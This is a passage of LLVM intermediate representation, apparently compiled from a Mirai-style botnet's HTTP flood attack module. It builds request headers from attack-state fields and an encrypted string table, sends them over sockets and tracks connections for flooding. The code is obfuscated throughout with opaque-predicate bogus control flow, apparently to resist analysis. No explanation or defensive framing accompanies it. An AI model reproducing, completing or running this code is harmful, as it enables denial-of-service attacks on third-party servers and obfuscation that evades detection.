  %1002 = call i32 @util_strlen(i8* %1001)
  %1003 = sext i32 %1002 to i64
  %1004 = getelementptr inbounds i8, i8* %1000, i64 %1003
  %1005 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1006 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1005, i32 0, i32 6
  %1007 = getelementptr inbounds [257 x i8], [257 x i8]* %1006, i32 0, i32 0
  %1008 = call i32 @util_strcpy(i8* %1004, i8* %1007)
  %1009 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1010 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1011 = call i32 @util_strlen(i8* %1010)
  %1012 = sext i32 %1011 to i64
  %1013 = getelementptr inbounds i8, i8* %1009, i64 %1012
  %1014 = call i32 @util_strcpy(i8* %1013, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.3, i32 0, i32 0))
  %1015 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1016 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1017 = call i32 @util_strlen(i8* %1016)
  %1018 = sext i32 %1017 to i64
  %1019 = getelementptr inbounds i8, i8* %1015, i64 %1018
  %1020 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1021 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1020, i32 0, i32 5
  %1022 = getelementptr inbounds [512 x i8], [512 x i8]* %1021, i32 0, i32 0
  %1023 = call i32 @util_strcpy(i8* %1019, i8* %1022)
  %1024 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1025 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1026 = call i32 @util_strlen(i8* %1025)
  %1027 = sext i32 %1026 to i64
  %1028 = getelementptr inbounds i8, i8* %1024, i64 %1027
  %1029 = call i32 @util_strcpy(i8* %1028, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i32 0, i32 0))
  %1030 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1031 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1032 = call i32 @util_strlen(i8* %1031)
  %1033 = sext i32 %1032 to i64
  %1034 = getelementptr inbounds i8, i8* %1030, i64 %1033
  %1035 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1036 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1035, i32 0, i32 7
  %1037 = getelementptr inbounds [129 x i8], [129 x i8]* %1036, i32 0, i32 0
  %1038 = call i32 @util_strcpy(i8* %1034, i8* %1037)
  %1039 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1040 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1041 = call i32 @util_strlen(i8* %1040)
  %1042 = sext i32 %1041 to i64
  %1043 = getelementptr inbounds i8, i8* %1039, i64 %1042
  %1044 = call i32 @util_strcpy(i8* %1043, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 57)
  %1045 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1046 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1047 = call i32 @util_strlen(i8* %1046)
  %1048 = sext i32 %1047 to i64
  %1049 = getelementptr inbounds i8, i8* %1045, i64 %1048
  %1050 = call i8* @table_retrieve_val(i32 57, i32* null)
  %1051 = call i32 @util_strcpy(i8* %1049, i8* %1050)
  call void @table_lock_val(i8 zeroext 57)
  %1052 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1053 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1054 = call i32 @util_strlen(i8* %1053)
  %1055 = sext i32 %1054 to i64
  %1056 = getelementptr inbounds i8, i8* %1052, i64 %1055
  %1057 = call i32 @util_strcpy(i8* %1056, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 58)
  %1058 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1059 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1060 = call i32 @util_strlen(i8* %1059)
  %1061 = sext i32 %1060 to i64
  %1062 = getelementptr inbounds i8, i8* %1058, i64 %1061
  %1063 = call i8* @table_retrieve_val(i32 58, i32* null)
  %1064 = call i32 @util_strcpy(i8* %1062, i8* %1063)
  call void @table_lock_val(i8 zeroext 58)
  %1065 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1066 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1067 = call i32 @util_strlen(i8* %1066)
  %1068 = sext i32 %1067 to i64
  %1069 = getelementptr inbounds i8, i8* %1065, i64 %1068
  %1070 = call i32 @util_strcpy(i8* %1069, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 59)
  %1071 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1072 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1073 = call i32 @util_strlen(i8* %1072)
  %1074 = sext i32 %1073 to i64
  %1075 = getelementptr inbounds i8, i8* %1071, i64 %1074
  %1076 = call i8* @table_retrieve_val(i32 59, i32* null)
  %1077 = call i32 @util_strcpy(i8* %1075, i8* %1076)
  call void @table_lock_val(i8 zeroext 59)
  %1078 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1079 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1080 = call i32 @util_strlen(i8* %1079)
  %1081 = sext i32 %1080 to i64
  %1082 = getelementptr inbounds i8, i8* %1078, i64 %1081
  %1083 = call i32 @util_strcpy(i8* %1082, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  %1084 = load i8*, i8** %14, align 8
  %1085 = icmp ne i8* %1084, null
  %1086 = load i32, i32* @x.19
  %1087 = load i32, i32* @y.20
  %1088 = sub i32 %1086, 1
  %1089 = mul i32 %1086, %1088
  %1090 = urem i32 %1089, 2
  %1091 = icmp eq i32 %1090, 0
  %1092 = icmp slt i32 %1087, 10
  %1093 = or i1 %1091, %1092
  br i1 %1093, label %originalBBpart2123, label %originalBB121alteredBB

originalBBpart2123:                               ; preds = %originalBB121
  br i1 %1085, label %1094, label %1135

; <label>:1094:                                   ; preds = %originalBBpart2123
  call void @table_unlock_val(i8 zeroext 60)
  %1095 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1096 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1097 = call i32 @util_strlen(i8* %1096)
  %1098 = sext i32 %1097 to i64
  %1099 = getelementptr inbounds i8, i8* %1095, i64 %1098
  %1100 = call i8* @table_retrieve_val(i32 60, i32* null)
  %1101 = call i32 @util_strcpy(i8* %1099, i8* %1100)
  call void @table_lock_val(i8 zeroext 60)
  %1102 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1103 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1104 = call i32 @util_strlen(i8* %1103)
  %1105 = sext i32 %1104 to i64
  %1106 = getelementptr inbounds i8, i8* %1102, i64 %1105
  %1107 = call i32 @util_strcpy(i8* %1106, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  %1108 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1109 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1110 = call i32 @util_strlen(i8* %1109)
  %1111 = sext i32 %1110 to i64
  %1112 = getelementptr inbounds i8, i8* %1108, i64 %1111
  %1113 = call i8* @table_retrieve_val(i32 65, i32* null)
  %1114 = call i32 @util_strcpy(i8* %1112, i8* %1113)
  %1115 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1116 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1117 = call i32 @util_strlen(i8* %1116)
  %1118 = sext i32 %1117 to i64
  %1119 = getelementptr inbounds i8, i8* %1115, i64 %1118
  %1120 = call i32 @util_strcpy(i8* %1119, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0))
  %1121 = load i8*, i8** %14, align 8
  %1122 = call i32 @util_strlen(i8* %1121)
  %1123 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1124 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1125 = call i32 @util_strlen(i8* %1124)
  %1126 = sext i32 %1125 to i64
  %1127 = getelementptr inbounds i8, i8* %1123, i64 %1126
  %1128 = call i8* @util_itoa(i32 %1122, i32 10, i8* %1127)
  %1129 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1130 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1131 = call i32 @util_strlen(i8* %1130)
  %1132 = sext i32 %1131 to i64
  %1133 = getelementptr inbounds i8, i8* %1129, i64 %1132
  %1134 = call i32 @util_strcpy(i8* %1133, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  br label %1135

; <label>:1135:                                   ; preds = %1094, %originalBBpart2123
  %1136 = load i32, i32* @x.19
  %1137 = load i32, i32* @y.20
  %1138 = sub i32 %1136, 1
  %1139 = mul i32 %1136, %1138
  %1140 = urem i32 %1139, 2
  %1141 = icmp eq i32 %1140, 0
  %1142 = icmp slt i32 %1137, 10
  %1143 = or i1 %1141, %1142
  br i1 %1143, label %originalBB125, label %originalBB125alteredBB

originalBB125:                                    ; preds = %originalBB125alteredBB, %1135
  %1144 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1145 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1144, i32 0, i32 15
  %1146 = load i32, i32* %1145, align 4
  %1147 = icmp sgt i32 %1146, 0
  %1148 = load i32, i32* @x.19
  %1149 = load i32, i32* @y.20
  %1150 = sub i32 %1148, 1
  %1151 = mul i32 %1148, %1150
  %1152 = urem i32 %1151, 2
  %1153 = icmp eq i32 %1152, 0
  %1154 = icmp slt i32 %1149, 10
  %1155 = or i1 %1153, %1154
  br i1 %1155, label %originalBBpart2127, label %originalBB125alteredBB

originalBBpart2127:                               ; preds = %originalBB125
  br i1 %1147, label %1156, label %1214

; <label>:1156:                                   ; preds = %originalBBpart2127
  %1157 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1158 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1159 = call i32 @util_strlen(i8* %1158)
  %1160 = sext i32 %1159 to i64
  %1161 = getelementptr inbounds i8, i8* %1157, i64 %1160
  %1162 = call i32 @util_strcpy(i8* %1161, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i32 0, i32 0))
  store i32 0, i32* %10, align 4
  br label %1163

; <label>:1163:                                   ; preds = %originalBBpart2138, %1156
  %1164 = load i32, i32* %10, align 4
  %1165 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1166 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1165, i32 0, i32 15
  %1167 = load i32, i32* %1166, align 4
  %1168 = icmp slt i32 %1164, %1167
  br i1 %1168, label %1169, label %1207

; <label>:1169:                                   ; preds = %1163
  %1170 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1171 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1172 = call i32 @util_strlen(i8* %1171)
  %1173 = sext i32 %1172 to i64
  %1174 = getelementptr inbounds i8, i8* %1170, i64 %1173
  %1175 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1176 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1175, i32 0, i32 16
  %1177 = load i32, i32* %10, align 4
  %1178 = sext i32 %1177 to i64
  %1179 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %1176, i64 0, i64 %1178
  %1180 = getelementptr inbounds [128 x i8], [128 x i8]* %1179, i32 0, i32 0
  %1181 = call i32 @util_strcpy(i8* %1174, i8* %1180)
  %1182 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1183 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1184 = call i32 @util_strlen(i8* %1183)
  %1185 = sext i32 %1184 to i64
  %1186 = getelementptr inbounds i8, i8* %1182, i64 %1185
  %1187 = call i32 @util_strcpy(i8* %1186, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.7, i32 0, i32 0))
  br label %1188

; <label>:1188:                                   ; preds = %1169
  %1189 = load i32, i32* @x.19
  %1190 = load i32, i32* @y.20
  %1191 = sub i32 %1189, 1
  %1192 = mul i32 %1189, %1191
  %1193 = urem i32 %1192, 2
  %1194 = icmp eq i32 %1193, 0
  %1195 = icmp slt i32 %1190, 10
  %1196 = or i1 %1194, %1195
  br i1 %1196, label %originalBB129, label %originalBB129alteredBB

originalBB129:                                    ; preds = %originalBB129alteredBB, %1188
  %1197 = load i32, i32* %10, align 4
  %1198 = add nsw i32 %1197, 1
  store i32 %1198, i32* %10, align 4
  %1199 = load i32, i32* @x.19
  %1200 = load i32, i32* @y.20
  %1201 = sub i32 %1199, 1
  %1202 = mul i32 %1199, %1201
  %1203 = urem i32 %1202, 2
  %1204 = icmp eq i32 %1203, 0
  %1205 = icmp slt i32 %1200, 10
  %1206 = or i1 %1204, %1205
  br i1 %1206, label %originalBBpart2138, label %originalBB129alteredBB

originalBBpart2138:                               ; preds = %originalBB129
  br label %1163

; <label>:1207:                                   ; preds = %1163
  %1208 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1209 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1210 = call i32 @util_strlen(i8* %1209)
  %1211 = sext i32 %1210 to i64
  %1212 = getelementptr inbounds i8, i8* %1208, i64 %1211
  %1213 = call i32 @util_strcpy(i8* %1212, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  br label %1214

; <label>:1214:                                   ; preds = %1207, %originalBBpart2127
  %1215 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1216 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1217 = call i32 @util_strlen(i8* %1216)
  %1218 = sext i32 %1217 to i64
  %1219 = getelementptr inbounds i8, i8* %1215, i64 %1218
  %1220 = call i32 @util_strcpy(i8* %1219, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  %1221 = load i8*, i8** %14, align 8
  %1222 = icmp ne i8* %1221, null
  br i1 %1222, label %1223, label %1247

; <label>:1223:                                   ; preds = %1214
  %1224 = load i32, i32* @x.19
  %1225 = load i32, i32* @y.20
  %1226 = sub i32 %1224, 1
  %1227 = mul i32 %1224, %1226
  %1228 = urem i32 %1227, 2
  %1229 = icmp eq i32 %1228, 0
  %1230 = icmp slt i32 %1225, 10
  %1231 = or i1 %1229, %1230
  br i1 %1231, label %originalBB140, label %originalBB140alteredBB

originalBB140:                                    ; preds = %originalBB140alteredBB, %1223
  %1232 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1233 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1234 = call i32 @util_strlen(i8* %1233)
  %1235 = sext i32 %1234 to i64
  %1236 = getelementptr inbounds i8, i8* %1232, i64 %1235
  %1237 = load i8*, i8** %14, align 8
  %1238 = call i32 @util_strcpy(i8* %1236, i8* %1237)
  %1239 = load i32, i32* @x.19
  %1240 = load i32, i32* @y.20
  %1241 = sub i32 %1239, 1
  %1242 = mul i32 %1239, %1241
  %1243 = urem i32 %1242, 2
  %1244 = icmp eq i32 %1243, 0
  %1245 = icmp slt i32 %1240, 10
  %1246 = or i1 %1244, %1245
  br i1 %1246, label %originalBBpart2142, label %originalBB140alteredBB

originalBBpart2142:                               ; preds = %originalBB140
  br label %1247

; <label>:1247:                                   ; preds = %originalBBpart2142, %1214
  %1248 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1249 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1248, i32 0, i32 9
  %1250 = getelementptr inbounds [9 x i8], [9 x i8]* %1249, i32 0, i32 0
  %1251 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1252 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1251, i32 0, i32 10
  %1253 = getelementptr inbounds [9 x i8], [9 x i8]* %1252, i32 0, i32 0
  %1254 = call signext i8 @util_strcmp(i8* %1250, i8* %1253)
  %1255 = icmp ne i8 %1254, 0
  br i1 %1255, label %1264, label %1256

; <label>:1256:                                   ; preds = %1247
  %1257 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1258 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1257, i32 0, i32 9
  %1259 = getelementptr inbounds [9 x i8], [9 x i8]* %1258, i32 0, i32 0
  %1260 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1261 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1260, i32 0, i32 10
  %1262 = getelementptr inbounds [9 x i8], [9 x i8]* %1261, i32 0, i32 0
  %1263 = call i32 @util_strcpy(i8* %1259, i8* %1262)
  br label %1264

; <label>:1264:                                   ; preds = %1256, %1247
  %1265 = load i32, i32* @x.19
  %1266 = load i32, i32* @y.20
  %1267 = sub i32 %1265, 1
  %1268 = mul i32 %1265, %1267
  %1269 = urem i32 %1268, 2
  %1270 = icmp eq i32 %1269, 0
  %1271 = icmp slt i32 %1266, 10
  %1272 = or i1 %1270, %1271
  br i1 %1272, label %originalBB144, label %originalBB144alteredBB

originalBB144:                                    ; preds = %originalBB144alteredBB, %1264
  %1273 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1274 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1273, i32 0, i32 0
  %1275 = load i32, i32* %1274, align 4
  %1276 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1277 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1278 = call i32 @util_strlen(i8* %1277)
  %1279 = sext i32 %1278 to i64
  %1280 = call i64 @send(i32 %1275, i8* %1276, i64 %1279, i32 16384)
  %1281 = load i32, i32* %27, align 4
  %1282 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1283 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1282, i32 0, i32 3
  store i32 %1281, i32* %1283, align 4
  %1284 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1285 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1284, i32 0, i32 1
  store i8 6, i8* %1285, align 4
  %1286 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1287 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1286, i32 0, i32 0
  %1288 = load i32, i32* %1287, align 4
  %1289 = srem i32 %1288, 64
  %1290 = zext i32 %1289 to i64
  %1291 = shl i64 1, %1290
  %1292 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %1293 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1294 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1293, i32 0, i32 0
  %1295 = load i32, i32* %1294, align 4
  %1296 = sdiv i32 %1295, 64
  %1297 = sext i32 %1296 to i64
  %1298 = getelementptr inbounds [16 x i64], [16 x i64]* %1292, i64 0, i64 %1297
  %1299 = load i64, i64* %1298, align 8
  %1300 = or i64 %1299, %1291
  store i64 %1300, i64* %1298, align 8
  %1301 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1302 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1301, i32 0, i32 0
  %1303 = load i32, i32* %1302, align 4
  %1304 = load i32, i32* %23, align 4
  %1305 = icmp sgt i32 %1303, %1304
  %1306 = load i32, i32* @x.19
  %1307 = load i32, i32* @y.20
  %1308 = sub i32 %1306, 1
  %1309 = mul i32 %1306, %1308
  %1310 = urem i32 %1309, 2
  %1311 = icmp eq i32 %1310, 0
  %1312 = icmp slt i32 %1307, 10
  %1313 = or i1 %1311, %1312
  br i1 %1313, label %originalBBpart2194, label %originalBB144alteredBB

originalBBpart2194:                               ; preds = %originalBB144
  br i1 %1305, label %1314, label %1319

; <label>:1314:                                   ; preds = %originalBBpart2194
  %1315 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1316 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1315, i32 0, i32 0
  %1317 = load i32, i32* %1316, align 4
  %1318 = add nsw i32 %1317, 1
  store i32 %1318, i32* %23, align 4
  br label %1319

; <label>:1319:                                   ; preds = %1314, %originalBBpart2194
  br label %1527

; <label>:1320:                                   ; preds = %originalBBpart2119
  %1321 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1322 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1321, i32 0, i32 1
  %1323 = load i8, i8* %1322, align 4
  %1324 = zext i8 %1323 to i32
  %1325 = icmp eq i32 %1324, 6
  br i1 %1325, label %1326, label %1353

; <label>:1326:                                   ; preds = %1320
  %1327 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1328 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1327, i32 0, i32 0
  %1329 = load i32, i32* %1328, align 4
  %1330 = srem i32 %1329, 64
  %1331 = zext i32 %1330 to i64
  %1332 = shl i64 1, %1331
  %1333 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %1334 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1335 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1334, i32 0, i32 0
  %1336 = load i32, i32* %1335, align 4
  %1337 = sdiv i32 %1336, 64
  %1338 = sext i32 %1337 to i64
  %1339 = getelementptr inbounds [16 x i64], [16 x i64]* %1333, i64 0, i64 %1338
  %1340 = load i64, i64* %1339, align 8
  %1341 = or i64 %1340, %1332
  store i64 %1341, i64* %1339, align 8
  %1342 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1343 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1342, i32 0, i32 0
  %1344 = load i32, i32* %1343, align 4
  %1345 = load i32, i32* %23, align 4
  %1346 = icmp sgt i32 %1344, %1345
  br i1 %1346, label %1347, label %1352

; <label>:1347:                                   ; preds = %1326
  %1348 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1349 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1348, i32 0, i32 0
  %1350 = load i32, i32* %1349, align 4
  %1351 = add nsw i32 %1350, 1
  store i32 %1351, i32* %23, align 4
  br label %1352

; <label>:1352:                                   ; preds = %1347, %1326
  br label %1526

; <label>:1353:                                   ; preds = %1320
  %1354 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1355 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1354, i32 0, i32 1
  %1356 = load i8, i8* %1355, align 4
  %1357 = zext i8 %1356 to i32
  %1358 = icmp eq i32 %1357, 7
  br i1 %1358, label %1359, label %1418

; <label>:1359:                                   ; preds = %1353
  %1360 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1361 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1360, i32 0, i32 0
  %1362 = load i32, i32* %1361, align 4
  %1363 = srem i32 %1362, 64
  %1364 = zext i32 %1363 to i64
  %1365 = shl i64 1, %1364
  %1366 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %1367 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1368 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1367, i32 0, i32 0
  %1369 = load i32, i32* %1368, align 4
  %1370 = sdiv i32 %1369, 64
  %1371 = sext i32 %1370 to i64
  %1372 = getelementptr inbounds [16 x i64], [16 x i64]* %1366, i64 0, i64 %1371
  %1373 = load i64, i64* %1372, align 8
  %1374 = or i64 %1373, %1365
  store i64 %1374, i64* %1372, align 8
  %1375 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1376 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1375, i32 0, i32 0
  %1377 = load i32, i32* %1376, align 4
  %1378 = load i32, i32* %23, align 4
  %1379 = icmp sgt i32 %1377, %1378
  br i1 %1379, label %1380, label %1401

; <label>:1380:                                   ; preds = %1359
  %1381 = load i32, i32* @x.19
  %1382 = load i32, i32* @y.20
  %1383 = sub i32 %1381, 1
  %1384 = mul i32 %1381, %1383
  %1385 = urem i32 %1384, 2
  %1386 = icmp eq i32 %1385, 0
  %1387 = icmp slt i32 %1382, 10
  %1388 = or i1 %1386, %1387
  br i1 %1388, label %originalBB196, label %originalBB196alteredBB

originalBB196:                                    ; preds = %originalBB196alteredBB, %1380
  %1389 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1390 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1389, i32 0, i32 0
  %1391 = load i32, i32* %1390, align 4
  %1392 = add nsw i32 %1391, 1
  store i32 %1392, i32* %23, align 4
  %1393 = load i32, i32* @x.19
  %1394 = load i32, i32* @y.20
  %1395 = sub i32 %1393, 1
  %1396 = mul i32 %1393, %1395
  %1397 = urem i32 %1396, 2
  %1398 = icmp eq i32 %1397, 0
  %1399 = icmp slt i32 %1394, 10
  %1400 = or i1 %1398, %1399
  br i1 %1400, label %originalBBpart2201, label %originalBB196alteredBB

originalBBpart2201:                               ; preds = %originalBB196
  br label %1401

; <label>:1401:                                   ; preds = %originalBBpart2201, %1359
  %1402 = load i32, i32* @x.19
  %1403 = load i32, i32* @y.20
  %1404 = sub i32 %1402, 1
  %1405 = mul i32 %1402, %1404
  %1406 = urem i32 %1405, 2
  %1407 = icmp eq i32 %1406, 0
  %1408 = icmp slt i32 %1403, 10
  %1409 = or i1 %1407, %1408
  br i1 %1409, label %originalBB203, label %originalBB203alteredBB

originalBB203:                                    ; preds = %originalBB203alteredBB, %1401
  %1410 = load i32, i32* @x.19
  %1411 = load i32, i32* @y.20
  %1412 = sub i32 %1410, 1
  %1413 = mul i32 %1410, %1412
  %1414 = urem i32 %1413, 2
  %1415 = icmp eq i32 %1414, 0
  %1416 = icmp slt i32 %1411, 10
  %1417 = or i1 %1415, %1416
  br i1 %1417, label %originalBBpart2205, label %originalBB203alteredBB

originalBBpart2205:                               ; preds = %originalBB203
  br label %1525

; <label>:1418:                                   ; preds = %1353
  %1419 = load i32, i32* @x.19
  %1420 = load i32, i32* @y.20
  %1421 = sub i32 %1419, 1
  %1422 = mul i32 %1419, %1421
  %1423 = urem i32 %1422, 2
  %1424 = icmp eq i32 %1423, 0
  %1425 = icmp slt i32 %1420, 10
  %1426 = or i1 %1424, %1425
  br i1 %1426, label %originalBB207, label %originalBB207alteredBB

originalBB207:                                    ; preds = %originalBB207alteredBB, %1418
  %1427 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1428 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1427, i32 0, i32 1
  %1429 = load i8, i8* %1428, align 4
  %1430 = zext i8 %1429 to i32
  %1431 = icmp eq i32 %1430, 10
  %1432 = load i32, i32* @x.19
  %1433 = load i32, i32* @y.20
  %1434 = sub i32 %1432, 1
  %1435 = mul i32 %1432, %1434
  %1436 = urem i32 %1435, 2
  %1437 = icmp eq i32 %1436, 0
  %1438 = icmp slt i32 %1433, 10
  %1439 = or i1 %1437, %1438
  br i1 %1439, label %originalBBpart2209, label %originalBB207alteredBB

originalBBpart2209:                               ; preds = %originalBB207
  br i1 %1431, label %1440, label %1467

; <label>:1440:                                   ; preds = %originalBBpart2209
  %1441 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1442 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1441, i32 0, i32 0
  %1443 = load i32, i32* %1442, align 4
  %1444 = srem i32 %1443, 64
  %1445 = zext i32 %1444 to i64
  %1446 = shl i64 1, %1445
  %1447 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %1448 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1449 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1448, i32 0, i32 0
  %1450 = load i32, i32* %1449, align 4
  %1451 = sdiv i32 %1450, 64
  %1452 = sext i32 %1451 to i64
  %1453 = getelementptr inbounds [16 x i64], [16 x i64]* %1447, i64 0, i64 %1452
  %1454 = load i64, i64* %1453, align 8
  %1455 = or i64 %1454, %1446
  store i64 %1455, i64* %1453, align 8
